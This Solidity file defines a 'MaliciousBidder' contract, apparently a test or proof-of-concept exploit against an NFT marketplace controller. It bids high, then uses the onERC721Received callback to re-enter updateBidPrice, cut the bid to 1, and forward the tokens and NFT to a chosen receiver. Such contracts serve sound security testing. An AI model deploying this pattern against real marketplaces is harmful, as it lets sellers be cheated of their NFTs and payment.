// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface INFTController {
    function sellTokenTo(address _tokenAddr, uint256 _tokenId, address _to) external;
    function updateBidPrice(address _tokenAddr, uint256 _tokenId, uint256 _price) external;
    function bidToken(address _tokenAddr, uint256 _tokenId, uint256 _price, bool _withEther) external;
}

contract MaliciousBidder is ERC721Holder {
    INFTController public controller;
    address public tokenReciever;
    address public tokenAddr;
    uint256 public tokenId;
    uint256 public price;
    IERC20 public erc20Token;

    constructor(INFTController _controller) {
        controller = _controller;
    }

    function setTokenSaleDetails(address _tokenReciever, address _tokenAddr, uint256 _tokenId, IERC20 _token) external {
        tokenReciever = _tokenReciever;
        tokenAddr = _tokenAddr;
        tokenId = _tokenId;
        erc20Token = _token;
    }

    // make a very high bid so it is selected
    function bid(uint256 _price) external {
        price = _price;
        erc20Token.approve(address(controller), _price);
        controller.bidToken(address(erc20Token), tokenId, _price, false); // only creating a contract for ERC20 bids
    }

    function onERC721Received(address, address, uint256, bytes memory) public override returns (bytes4) {
        controller.updateBidPrice(tokenAddr, tokenId, 1); // smallest allowed price is 1
        erc20Token.transfer(tokenReciever, price - 1); // send recieved ERC20 tokens to tokenReciever
        IERC721(tokenAddr).safeTransferFrom(address(this), tokenReciever, tokenId); // send ERC721 token to tokenReciever

        return this.onERC721Received.selector;
    }
}